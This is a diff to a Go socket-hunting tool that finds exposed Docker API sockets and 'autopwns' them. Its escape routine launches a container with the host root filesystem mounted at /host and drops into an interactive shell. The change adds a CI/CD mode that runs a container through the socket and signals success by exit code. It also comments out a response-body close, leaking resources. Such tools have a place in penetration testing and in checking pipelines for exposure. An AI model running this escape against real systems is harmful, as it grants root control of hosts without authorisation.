@@ -23,9 +23,10 @@ import (
 	"golang.org/x/crypto/ssh/terminal"
 )
 
-var verbosePtr, huntSockPtr, huntHttpPtr, huntDockerPtr, interfacesPtr, toJsonPtr, autopwnPtr *bool
+var verbosePtr, huntSockPtr, huntHttpPtr, huntDockerPtr, interfacesPtr, toJsonPtr, autopwnPtr, cicdPtr *bool
 var validSocks []string
 var foundSock bool
+var exitCode int
 
 type IpAddress struct {
 	Address string
@@ -39,6 +40,7 @@ type Interface struct {
 func main() {
 	fmt.Println("[+] Hunt 'dem Socks")
 	foundSock = false
+	exitCode = 0
 	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
 
 	pathPtr := flag.String("path", ".", "Path to Start Scanning for UNIX Domain Sockets")
@@ -49,6 +51,7 @@ func main() {
 	interfacesPtr = flag.Bool("interfaces", false, "Display available network interfaces")
 	toJsonPtr = flag.Bool("json", false, "Return output in JSON format")
 	autopwnPtr = flag.Bool("autopwn", false, "Attempt to autopwn exposed sockets")
+	cicdPtr = flag.Bool("cicd", false, "Attempt to autopwn but don't drop to TTY,return exit code 1 if successful else 0")
 
 	flag.Parse()
 	var sockets, httpSockets []string
@@ -113,6 +116,7 @@ func main() {
 		}
 	}
 	fmt.Println("[+] Finished")
+	os.Exit(exitCode)
 }
 
 func downloadFile(filepath string, url string) error {
@@ -135,10 +139,23 @@ func downloadFile(filepath string, url string) error {
 	return err
 }
 
+func execDocker(dockerSockPath string) error {
+	cmd := "./docker/docker -H unix://" + dockerSockPath + " run docker id"
+	out, err := exec.Command("sh", "-c", cmd).Output()
+	if err != nil {
+		return err
+	}
+	if *verbosePtr {
+		fmt.Printf("[*] Command Output: %s\n", string(out[:]))
+	}
+	exitCode = 1
+	return nil
+}
+
 func dropToTTY(dockerSockPath string) error {
 	// this code has been copy+pasted directly from https://github.com/kr/pty, it's that awesome
-	strCommand := "./docker/docker -H unix://" + dockerSockPath + " run -t -i -v /:/host alpine:latest /bin/sh"
-	c := exec.Command("sh", "-c", strCommand)
+	cmd := "./docker/docker -H unix://" + dockerSockPath + " run -t -i -v /:/host alpine:latest /bin/sh"
+	c := exec.Command("sh", "-c", cmd)
 
 	// Start the command with a pty.
 	ptmx, err := pty.Start(c)
@@ -201,12 +218,21 @@ func autopwn(dockerSock string) error {
 
 	fmt.Println("[+] Attempting to escape to host...")
 
-	err = dropToTTY(dockerSock)
-	if err != nil {
-		return err
-	}
+	if *cicdPtr {
+		fmt.Println("[+] Attempting in CICD Mode")
+		err := execDocker(dockerSock)
+		if err != nil {
+			return err
+		}
 
-	fmt.Println("[*] Successfully exited TTY")
+	} else {
+		fmt.Println("[+] Attempting in TTY Mode")
+		err := dropToTTY(dockerSock)
+		if err != nil {
+			return err
+		}
+		fmt.Println("[*] Successfully exited TTY")
+	}
 	return nil
 }
 
@@ -301,6 +327,8 @@ func getDockerEnabledSockets(socks []string) []string {
 	fmt.Println("[+] Hunting Docker Socks")
 	var dockerSocks []string
 	for _, element := range socks {
+		// if strings.Contains(element, "docker.sock") {
+		// fmt.Println("FOUND DOCKER.SOCK")
 		resp, err := checkSock(element)
 		if err == nil {
 			if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
@@ -319,6 +347,8 @@ func getDockerEnabledSockets(socks []string) []string {
 				fmt.Println("[+] Invalid Docker Socket: " + element)
 			}
 		}
+		// }
+
 	}
 	return dockerSocks
 }
@@ -326,9 +356,9 @@ func getDockerEnabledSockets(socks []string) []string {
 func getHTTPEnabledSockets(socks []string) []string {
 	var httpSocks []string
 	for _, element := range socks {
-		resp, err := checkSock(element)
+		_, err := checkSock(element)
 		if err == nil {
-			defer resp.Body.Close()
+			// defer resp.Body.Close()
 			httpSocks = append(httpSocks, element)
 			if *verbosePtr {
 				fmt.Println("[+] Valid HTTP Socket: " + element)
@@ -380,6 +410,7 @@ func checkSock(path string) (*http.Response, error) {
 		fmt.Println("[-] Checking Sock for HTTP: " + path)
 	}
 
+	// if strings.Contains(path, "docker.sock") {
 	u := &httpunix.Transport{
 		DialTimeout:           100 * time.Millisecond,
 		RequestTimeout:        1 * time.Second,
@@ -395,6 +426,8 @@ func checkSock(path string) (*http.Response, error) {
 		return nil, err
 	}
 	return resp, nil
+	// }
+	// return nil, nil
 }
 
 func debug(data []byte, err error) {
